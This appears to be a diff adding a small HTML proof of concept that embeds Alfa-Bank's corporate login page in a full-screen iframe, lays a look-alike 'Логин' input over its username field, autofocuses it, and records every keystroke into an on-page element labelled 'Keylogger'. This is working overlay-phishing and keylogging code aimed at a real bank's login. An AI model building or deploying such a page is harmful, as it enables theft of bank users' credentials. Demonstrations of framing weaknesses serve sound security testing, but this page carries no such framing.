@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+    <style>
+        #overlay-input{
+            border: 1px solid red;
+            position: absolute;
+            width: 290px;
+            height: 50px;
+            top: 260px;
+            left: calc(50% - 180px);
+            padding: 8px;
+        }
+        #overlay-input input {
+            height: 40px;
+            width: 250px;
+            background: #E0E0E0;
+            color: black;
+            font-size: 18px;
+            border: 0;
+        }
+        #overlay-input input:focus {
+            outline: none;
+        }
+    </style>
+</head>
+<body style="margin: 0">
+    <div id="log" style="border: 1px solid red; color: black;width: 100vw; height: 30px;">Keylogger: </div>
+    <div style="position: relative;">
+        <iframe
+                id="frame"
+                src="https://private.auth.alfabank.ru/passport/cerberus-mini-blue/dashboard-blue/corp-username"
+        style="width: 100vw; height: 100vh; border: 0;" ></iframe>
+        <div id="overlay-input">
+            <input name="login" placeholder="Логин" tabindex="0">
+        </div>
+    </div>
+<script>
+    window.addEventListener("message", receiveMessage, false);
+    function receiveMessage(event){
+        console.log(event.data);//the value of message
+        //now i need to send an answer 'this is a response'
+    }
+    document.addEventListener('keypress', (event) =>  {
+        document.getElementById('log').innerText += event.key
+    })
+    setTimeout(() => {
+        document.querySelector('#overlay-input input').focus();
+    }, 200);
+
+</script>
+</body>
+</html>
